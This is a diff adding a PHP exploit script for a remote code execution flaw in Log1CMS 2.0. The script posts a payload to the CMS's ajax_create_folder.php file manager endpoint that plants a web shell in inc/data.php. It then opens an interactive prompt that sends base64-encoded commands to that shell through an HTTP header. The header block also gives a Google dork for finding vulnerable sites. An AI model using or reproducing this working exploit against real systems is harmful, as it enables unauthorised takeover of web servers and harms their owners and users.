@@ -1,0 +1,77 @@
+<?php
+/*
++-----------------------------------------------------------+
++ Log1CMS 2.0(ajax_create_folder.php) Remote Code Execution + 
++-----------------------------------------------------------+
+  
+Web-App        : Log1CMS 2.0
+Vendor         : http://log1cms.sourceforge.net/
+Vulnerability  : Remote Code Execution
+Author         : Adel SBM
+Website        : www.The-code.tk
+Facebook       : http://www.facebook.com/profile.php?id=100002938082057
+Google-Dork    : "POWERED BY LOG1 CMS"
+Tested on      : Windows XP SP2
+                         
++-----------------------------------------------------------+
++                     VIVE Algeria                          + 
++-----------------------------------------------------------+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+ 
+function http_send($host, $packet)
+{
+    if (!($sock = fsockopen($host, 80)))
+        die( "\n[-] No Response From {$host}:80\n");
+ 
+    fwrite($sock, $packet);
+    return stream_get_contents($sock);
+}
+ 
+print "\n+------------------------------------------------------------------------+";
+print "\n| Log1CMS 2.0  Remote Code Execution Exploit by Adel SBM                 |";
+print "\n| SPl ThanX To: EgiX(exploit founder end coder)-The DoN                  |";
+print "\n| Greetz to: Over-X & ind0ushka ..                                       |";
+print "\n| TeaM Official website: www.The-code.tk                                 |";
+print "\n| VIVE Algeria                                                           |";
+print "\n+------------------------------------------------------------------------+\n";
+ 
+if ($argc < 3)
+{
+print "\n+------------------------------------------------------------------------+";
+print "\n| Usage......: php $argv[0] <host> <path>                                 |";
+print "\n| Example....: php $argv[0] localhost /                                   |";
+print "\n| Example....: php $argv[0] localhost /log1cms/                           |";
+print "\n+------------------------------------------------------------------------+\n";
+die();
+}
+ 
+$host = $argv[1];
+$path = $argv[2];
+ 
+$payload = "foo=<?php error_reporting(0);print(_code_);passthru(base64_decode(\$_SERVER[HTTP_CMD]));die; ?>";
+$packet  = "POST {$path}admin/libraries/ajaxfilemanager/ajax_create_folder.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n{$payload}";
+ 
+http_send($host, $packet);
+ 
+$packet  = "GET {$path}admin/libraries/ajaxfilemanager/inc/data.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+ 
+while(1)
+{
+    print "\n@AdelSBM# ";
+    if (($cmd = trim(fgets(STDIN))) == "exit") break;
+    preg_match("/_code_(.*)/s", http_send($host, sprintf($packet, base64_encode($cmd))), $m) ?
+    print $m[1] : die("\n[-] Exploit failed!\n");
+}
+ 
+?>
